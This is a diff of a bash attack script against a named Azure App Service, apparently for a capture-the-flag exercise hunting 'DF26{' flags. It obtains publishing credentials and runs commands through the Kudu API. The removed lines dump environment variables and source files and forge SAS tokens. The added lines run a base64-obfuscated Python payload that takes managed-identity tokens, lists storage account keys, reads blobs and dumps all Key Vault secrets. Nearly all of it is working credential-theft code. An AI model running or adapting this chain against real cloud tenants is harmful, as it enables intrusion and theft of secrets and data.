@@ -1,5 +1,4 @@
 #!/usr/bin/env bash
-# Kudu command API (publishing creds) -> printenv + read source of reporting app -> connstring -> flag blob.
 set +e
 SUB="$AZURE_SUBSCRIPTION_ID"; TEN="$AZURE_TENANT_ID"; RRG="rg-tbl-reporting-prod-eus"; APPR="app-tbl-reporting-prod"; AUD="api://AzureADTokenExchange"
 SCM="https://$APPR.scm.azurewebsites.net"
@@ -11,43 +10,11 @@ MG=$(curl -s -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" 
 curl -s -X POST -H "Authorization: Bearer $MG" -H 'Content-Length: 0' "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RRG/providers/Microsoft.Web/sites/$APPR/config/publishingcredentials/list?api-version=2023-12-01" > /tmp/pc.json
 U=$(jq -r '.properties.publishingUserName' /tmp/pc.json); P=$(jq -r '.properties.publishingPassword' /tmp/pc.json)
 BA=$(printf '%s:%s' "$U" "$P" | base64 | tr -d '\n')
-
-echo "### warm up app + scm"
-curl -s -m 60 -o /dev/null -w "app /: %{http_code}\n" "https://$APPR.azurewebsites.net/"
-for i in 1 2 3 4 5; do C=$(curl -s -m 60 -o /dev/null -w '%{http_code}' -H "Authorization: Basic $BA" "$SCM/api/settings"); echo "scm warm $i: $C"; [ "$C" = "200" ] && break; sleep 5; done
-
-kudu_cmd(){ curl -s -m 90 -X POST -H "Authorization: Basic $BA" -H "Content-Type: application/json" "$SCM/api/command" -d "{\"command\":\"$1\",\"dir\":\"site/wwwroot\"}"; }
-
-echo "### printenv (look for CONFIG_STORAGE_CONNECTION / DF26)"
-kudu_cmd "printenv" > /tmp/env.json; jq -r '.Output' /tmp/env.json 2>/dev/null | grep -iE "CONFIG_STORAGE|STORAGE|CONNECTION|DF26|ACCOUNT|SECRET|VAULT|IDENTITY" ; echo "(exit $(jq -r '.ExitCode' /tmp/env.json 2>/dev/null))"
-echo "### ls wwwroot"
-kudu_cmd "ls -la" | jq -r '.Output' 2>/dev/null
-echo "### cat python sources"
-kudu_cmd "cat *.py 2>/dev/null; echo ---; cat *.json 2>/dev/null; echo ---; cat *.txt 2>/dev/null" | jq -r '.Output' 2>/dev/null | head -c 4000
-
-echo "### parse env for storage connstring and READ flag blob"
-jq -r '.Output' /tmp/env.json 2>/dev/null > /tmp/env.txt
-python3 - <<'PY'
-import re,base64,hmac,hashlib,urllib.parse,urllib.request
-env=open('/tmp/env.txt').read()
-for line in env.splitlines():
-    if 'DF26{' in line: print("FLAG ENV:",line)
-m=re.findall(r'(DefaultEndpointsProtocol=.*?AccountKey=[^;\s]+;?[^\s]*)', env)
-# also AccountName/AccountKey separate
-for cs in set(m):
-    d=dict(p.split('=',1) for p in cs.split(';') if '=' in p)
-    acct=d.get('AccountName'); key=d.get('AccountKey')
-    if not (acct and key): continue
-    print("CONNSTR acct",acct)
-    sv="2021-08-06"; sts="\n".join([acct,"rl","b","sco","2026-10-21T00:00:00Z","2026-10-24T00:00:00Z","","https",sv,""])+"\n"
-    sig=base64.b64encode(hmac.new(base64.b64decode(key),sts.encode(),hashlib.sha256).digest()).decode()
-    sas=urllib.parse.urlencode({"sv":sv,"ss":"b","srt":"sco","sp":"rl","st":"2026-10-21T00:00:00Z","se":"2026-10-24T00:00:00Z","spr":"https","sig":sig})
-    def g(u):
-        try: return urllib.request.urlopen(urllib.request.Request(u,headers={"x-ms-version":sv}),timeout=20).read().decode('utf-8','replace')
-        except Exception as e:
-            try: return e.read().decode('utf-8','replace')
-            except: return str(e)
-    print("  config blobs:", re.findall(r"<Name>([^<]+)</Name>", g(f"https://{acct}.blob.core.windows.net/config?restype=container&comp=list&{sas}")))
-    print("  >>> internal-config.json:\n", g(f"https://{acct}.blob.core.windows.net/config/internal-config.json?{sas}"))
-PY
+curl -s -m 60 -o /dev/null "https://$APPR.azurewebsites.net/"
+for i in 1 2 3 4 5 6; do C=$(curl -s -m 60 -o /dev/null -w '%{http_code}' -H "Authorization: Basic $BA" "$SCM/api/settings"); echo "scm warm $i: $C"; [ "$C" = "200" ] && break; sleep 5; done
+PY64="aW1wb3J0IG9zLGpzb24sdXJsbGliLnJlcXVlc3QsdXJsbGliLnBhcnNlLGJhc2U2NCxobWFjLGhhc2hsaWIscmUKaWU9b3MuZW52aXJvbi5nZXQoIklERU5USVRZX0VORFBPSU5UIiwiIik7IGloPW9zLmVudmlyb24uZ2V0KCJJREVOVElUWV9IRUFERVIiLCIiKQpDSUQ9IjdhODUxNTZhLTAxYzQtNGU2MS04NDcyLTQwYTkyMTA3MTU5YiIKU1VCPSJjNWU0ZTAwNC1iNDJkLTRhYzQtYTUwMi01ZmQzMzgzODBlYjYiOyBSRz0icmctdGJsLXBsYXRmb3JtLXByb2Qtc2VhIjsgQUNDPSJzdHRibGFwcGNmZ3Byb2R4M2V1b3oiCmRlZiB0b2socmVzKToKICAgIHU9aWUrIj9yZXNvdXJjZT0iK3VybGxpYi5wYXJzZS5xdW90ZShyZXMsc2FmZT0iIikrIiZhcGktdmVyc2lvbj0yMDE5LTA4LTAxJmNsaWVudF9pZD0iK0NJRAogICAgdHJ5OiByZXR1cm4ganNvbi5sb2Fkcyh1cmxsaWIucmVxdWVzdC51cmxvcGVuKHVybGxpYi5yZXF1ZXN0LlJlcXVlc3QodSxoZWFkZXJzPXsiWC1JREVOVElUWS1IRUFERVIiOmlofSksdGltZW91dD0yNSkucmVhZCgpKS5nZXQoImFjY2Vzc190b2tlbiIsIiIpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgdHJ5OiByZXR1cm4gIkVSUjoiK2UucmVhZCgpLmRlY29kZSgpWzoxNTBdCiAgICAgICAgZXhjZXB0OiByZXR1cm4gIkVSUjoiK3N0cihlKVs6MTUwXQpkZWYgcmVxKHUsaCxtZXRob2Q9IkdFVCIsZGF0YT1Ob25lKToKICAgIHRyeToKICAgICAgICByPXVybGxpYi5yZXF1ZXN0LlJlcXVlc3QodSxoZWFkZXJzPWgsbWV0aG9kPW1ldGhvZCxkYXRhPWRhdGEpCiAgICAgICAgcmV0dXJuIHVybGxpYi5yZXF1ZXN0LnVybG9wZW4ocix0aW1lb3V0PTI1KS5yZWFkKCkuZGVjb2RlKCJ1dGYtOCIsInJlcGxhY2UiKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHRyeTogcmV0dXJuICJFUlIlczolcyIlKGdldGF0dHIoZSwnY29kZScsJz8nKSxlLnJlYWQoKS5kZWNvZGUoInV0Zi04IiwicmVwbGFjZSIpWzozMDBdKQogICAgICAgIGV4Y2VwdDogcmV0dXJuICJFUlI6IitzdHIoZSlbOjIwMF0KT1VUPXsiaWVfcHJlc2VudCI6Ym9vbChpZSksImloX2xlbiI6bGVuKGloKX0KT1VUWyJlbnZmbGFnIl09WyAoayx2KSBmb3Igayx2IGluIG9zLmVudmlyb24uaXRlbXMoKSBpZiAiREYyNnsiIGluIHN0cih2KSBdCiMgMSkgc3RvcmFnZSBkYXRhLXBsYW5lIGRpcmVjdCBibG9iIHJlYWQKc3Q9dG9rKCJodHRwczovL3N0b3JhZ2UuYXp1cmUuY29tLyIpOyBPVVRbInN0Il09c3RbOjEyXQppZiBzdCBhbmQgbm90IHN0LnN0YXJ0c3dpdGgoIkVSUiIpOgogICAgT1VUWyJibG9iX2RpcmVjdCJdPXJlcSgiaHR0cHM6Ly8lcy5ibG9iLmNvcmUud2luZG93cy5uZXQvY29uZmlnL2ludGVybmFsLWNvbmZpZy5qc29uIiVBQ0MseyJBdXRob3JpemF0aW9uIjoiQmVhcmVyICIrc3QsIngtbXMtdmVyc2lvbiI6IjIwMjEtMDgtMDYifSlbOjgwMF0KICAgIE9VVFsiY29udGFpbmVycyJdPXJlLmZpbmRhbGwociI8TmFtZT4oW148XSspPC9OYW1lPiIsIHJlcSgiaHR0cHM6Ly8lcy5ibG9iLmNvcmUud2luZG93cy5uZXQvP2NvbXA9bGlzdCIlQUNDLHsiQXV0aG9yaXphdGlvbiI6IkJlYXJlciAiK3N0LCJ4LW1zLXZlcnNpb24iOiIyMDIxLTA4LTA2In0pKQojIDIpIG1hbmFnZW1lbnQgbGlzdEtleXMgLT4gU0FTIC0+IGJsb2IKbWc9dG9rKCJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIpOyBPVVRbIm1nIl09bWdbOjEyXQppZiBtZyBhbmQgbm90IG1nLnN0YXJ0c3dpdGgoIkVSUiIpOgogICAga3I9cmVxKCJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tL3N1YnNjcmlwdGlvbnMvJXMvcmVzb3VyY2VHcm91cHMvJXMvcHJvdmlkZXJzL01pY3Jvc29mdC5TdG9yYWdlL3N0b3JhZ2VBY2NvdW50cy8lcy9saXN0S2V5cz9hcGktdmVyc2lvbj0yMDIzLTA1LTAxIiUoU1VCLFJHLEFDQykseyJBdXRob3JpemF0aW9uIjoiQmVhcmVyICIrbWcsIkNvbnRlbnQtTGVuZ3RoIjoiMCJ9LCJQT1NUIikKICAgIHRyeToga2V5PWpzb24ubG9hZHMoa3IpWyJrZXlzIl1bMF1bInZhbHVlIl07IE9VVFsibGlzdEtleXMiXT0iT0siCiAgICBleGNlcHQgRXhjZXB0aW9uOiBrZXk9Tm9uZTsgT1VUWyJsaXN0S2V5cyJdPWtyWzoyMDBdCiAgICBpZiBrZXk6CiAgICAgICAgc3Y9IjIwMjEtMDgtMDYiOyBzdHM9IlxuIi5qb2luKFtBQ0MsInJsIiwiYiIsInNjbyIsIjIwMjYtMTAtMjFUMDA6MDA6MDBaIiwiMjAyNi0xMC0yNFQwMDowMDowMFoiLCIiLCJodHRwcyIsc3YsIiJdKSsiXG4iCiAgICAgICAgc2lnPWJhc2U2NC5iNjRlbmNvZGUoaG1hYy5uZXcoYmFzZTY0LmI2NGRlY29kZShrZXkpLHN0cy5lbmNvZGUoKSxoYXNobGliLnNoYTI1NikuZGlnZXN0KCkpLmRlY29kZSgpCiAgICAgICAgc2FzPXVybGxpYi5wYXJzZS51cmxlbmNvZGUoeyJzdiI6c3YsInNzIjoiYiIsInNydCI6InNjbyIsInNwIjoicmwiLCJzdCI6IjIwMjYtMTAtMjFUMDA6MDA6MDBaIiwic2UiOiIyMDI2LTEwLTI0VDAwOjAwOjAwWiIsInNwciI6Imh0dHBzIiwic2lnIjpzaWd9KQogICAgICAgIE9VVFsiY2ZnX2Jsb2JzIl09cmUuZmluZGFsbChyIjxOYW1lPihbXjxdKyk8L05hbWU+IiwgcmVxKCJodHRwczovLyVzLmJsb2IuY29yZS53aW5kb3dzLm5ldC9jb25maWc/cmVzdHlwZT1jb250YWluZXImY29tcD1saXN0JiVzIiUoQUNDLHNhcykse30pKQogICAgICAgIE9VVFsiaW50ZXJuYWxfY29uZmlnIl09cmVxKCJodHRwczovLyVzLmJsb2IuY29yZS53aW5kb3dzLm5ldC9jb25maWcvaW50ZXJuYWwtY29uZmlnLmpzb24/JXMiJShBQ0Msc2FzKSx7fSlbOjgwMF0KIyAzKSB2YXVsdCAtPiBrdi10Ymwtc2VjICsga3YtdGJsLXByb2QKdnQ9dG9rKCJodHRwczovL3ZhdWx0LmF6dXJlLm5ldC8iKTsgT1VUWyJ2dCJdPXZ0WzoxMl0KaWYgdnQgYW5kIG5vdCB2dC5zdGFydHN3aXRoKCJFUlIiKToKICAgIGZvciBrdiBpbiAoImt2LXRibC1zZWMteDNldW96Iiwia3YtdGJsLXByb2QteDNldW96Iik6CiAgICAgICAgZD1yZXEoImh0dHBzOi8vJXMudmF1bHQuYXp1cmUubmV0L3NlY3JldHM/YXBpLXZlcnNpb249Ny40IiVrdix7IkF1dGhvcml6YXRpb24iOiJCZWFyZXIgIit2dH0pCiAgICAgICAgdHJ5OgogICAgICAgICAgICBpZHM9W3NbImlkIl0gZm9yIHMgaW4ganNvbi5sb2FkcyhkKS5nZXQoInZhbHVlIixbXSldOyBPVVRba3ZdPWlkcwogICAgICAgICAgICBmb3IgaSBpbiBpZHM6CiAgICAgICAgICAgICAgICBPVVRba3YrIjo6IitpLnNwbGl0KCIvIilbLTFdXT1yZXEoaSsiP2FwaS12ZXJzaW9uPTcuNCIseyJBdXRob3JpemF0aW9uIjoiQmVhcmVyICIrdnR9KVs6MzAwXQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246IE9VVFtrdl09ZFs6MjAwXQpwcmludCgiVEJMUkVTVUxUPSIranNvbi5kdW1wcyhPVVQpKQo="
+echo "### running MSI->flag chain via kudu command"
+RESP=$(curl -s -m 110 -X POST -H "Authorization: Basic $BA" -H "Content-Type: application/json" "$SCM/api/command"   -d "{\"command\":\"echo $PY64 | base64 -d > /tmp/mf.py && python3 /tmp/mf.py\",\"dir\":\"site/wwwroot\"}")
+echo "$RESP" | jq -r '.Output' 2>/dev/null || echo "$RESP"
+echo "--- stderr ---"; echo "$RESP" | jq -r '.Error' 2>/dev/null
 echo "=== DONE ==="
